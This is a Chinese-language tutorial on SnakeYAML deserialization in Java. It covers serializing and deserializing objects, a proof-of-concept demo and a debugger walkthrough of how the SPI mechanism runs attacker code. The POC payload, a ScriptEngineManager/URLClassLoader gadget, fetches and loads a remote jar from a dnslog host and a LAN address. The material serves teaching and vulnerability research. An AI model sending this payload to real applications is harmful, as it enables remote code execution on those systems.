S-SnakeYaml反序列化
SnakeYaml 基本使用
导包
序列化
MyClass 类
序列化测试
    org.yaml
    snakeyaml
    1.27
package test;
public class Myclass {
    String value;
    public Myclass(String args){
        value=args;
    }
    public String getValue(){
        return value;
    }
}
package test;
import org.junit.Test;
import org.yaml.snakeyaml.Yaml;
import java.util.HashMap;
public class tes {
    @Test
    public void test(){
        Myclass obj = new Myclass("this is my data");
        HashMap data = new HashMap<>();
        data.put("Myclass",obj);
        Yaml yaml = new Yaml();
        String dump = yaml.dump(data);
        System.out.println(dump);
    }
}
结果
前面的 !! 是用于强制类型转化，强制转换为 !! 后指定的类型，其实这个和 Fastjson 的 @type 有
着异曲同工之妙。用于指定反序列化的全类名
反序列化
yaml 文件
反序列化测试
结果
反序列化漏洞
漏洞复现
POC
Myclass: !!test.Myclass {}
name:"zhangsan"
sex:man
age:20
id:1000001
package test;
import org.junit.Test;
import org.yaml.snakeyaml.Yaml;
import java.io.InputStream;
public class unserial {
    @Test
    public void test(){
        Yaml yaml = new Yaml();
        InputStream resourceAsStream = 
this.getClass().getClassLoader().getResourceAsStream("test.yaml");
        Object load = yaml.load(resourceAsStream);
        System.out.println(load);
    }
}
name:"zhangsan" sex:man age:20 id:1000001
结果
上面只是简单的进行 url 访问，要想深入利用，可以参考该项目：yaml反序列化payload
SPI机制
SPI ，全称为 Service Provider Interface ，是一种服务发现机制。它通过在 ClassPath 路径
下的 META-INF/services 文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口
寻找服务实现。那么如果需要使用 SPI 机制需要在 Java classpath 下的 META-INF/services/
目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。
SPI 实现原理：程序会 java.util.ServiceLoder 动态装载实现模块，在 META-INF/services 目
录下的配置文件寻找实现类的类名，通过 Class.forName 加载进来, newInstance() 反射创建对
象,并存到缓存和列表里面。
import org.yaml.snakeyaml.Yaml;
public class demo {
    public static void main(String[] args) {
        String malicious="!!javax.script.ScriptEngineManager 
[!!java.net.URLClassLoader [[!!java.net.URL [\"http://wopjpp.dnslog.cn\"]]]]";
        Yaml yaml = new Yaml();
        yaml.load(malicious);
    }
}
漏洞分析
前面说到 SPI 会通过 java.util.ServiceLoder 进行动态加载实现，而在刚刚的 exp 的代码里面
实现了 ScriptEngineFactory 并在 META-INF/services/ 里面添加了实现类的类名，而该类在静
态代码块处是我们的执行命令的代码，而在调用的时候， SPI 机制通过 Class.forName 反射加载
并且 newInstance() 反射创建对象的时候，静态代码块进行执行，从而达到命令执行的目的。 
首先在代码执行的位置下断点,然后查看程序执行反序列化的调用堆栈. 
根据上面的堆栈,追踪到
org.yaml.snakeyaml.constructor.BaseConstructor#constructObjectNoCheck  
此处计算 this.constructedObjects.containsKey(node) 为 False ,所以会执行
constructor.construct(node) ,因此需要先查看 Construct constructor = 
this.getConstructor(node)  
这里先查看一个这个 node 参数是什么,是一个多重嵌套的结构,内容就是其中序列化之后yaml字符
串的内容.每一个键都是一个node 
之后通过计算 this.constructedObjects.containsKey(node) 为 False ,进入到
constructor.construct(node) 中. 
强制进入,跳转到 org.yaml.snakeyaml.constructor.Constructor#getConstructor 方法当中. 
之后继续进入 getClassForNode 方法. 
首先通115行,从this.typeTags这个hashMap中取tag值,没有的话就通过
node.getTag().getClassName获取类名,为 javax.script.ScriptEngineManager ,这里与我们的
传值有关,所以再看一下需要反序列化的payload: !!javax.script.ScriptEngineManager 
[!!java.net.URLClassLoader [[!!java.net.URL [\"http://192.168.87.1/yaml-
payload/yaml-payload.jar\"]]]] . 
获取到类名之后通过 getClassForName 获取到类对象.之后返回的也是获取到的类对象. 
程序返回,然后再进入construct方法中 
此处第160行通过 node.getType().getDeclaredConstructors(); 获取到全部的构造方法,而这
个 node.getType 是上一步获取的那个类对象,也就是 javax.script.ScriptEngineManager 的类
对象. 
之后通过一系列的计算,最后需要通过这个 newInstance 方法去创建对象. 
在上述的payload里面,每一个键都是一个类,所以创建对象的这一个步骤会多次调用,分别创建不同
的对象,在创建 javax.script.ScriptEngineManager 对象时就会触发payload.那么此处到底是
如何在创建 javax.script.ScriptEngineManager 时触发代码的,这个需要深入了解 SPI 的实现
机制
SPI 机制
将断点停在创建 javax.script.ScriptEngineManager 对象的位置. 
通过一路的反射调用,进入 javax.script.ScriptEngineManager 的构造方法中. 
进入 init 方法当中 
再进入 initEngines 方法，在此第123行，进行 iterator 取值时会触发payload，此处迭代器取
第二个数据时触发。
首先还需要使用 hasNext 方法，判断是否存在，在 hasNext 的过程中，会调用一个
hasNextService 方法去寻找 META-INF/services/javax.script.ScriptEngineFactory 中的
配置，判断是否存在，如果存在就返回True 
然后通过 next 方法取值。深入跟踪一下这个 next 方法 
此处涉及到第370行，通过 URLClassLoader 的方法加载远程的jar包。 
最后在380行通过反射创建对象，触发 payload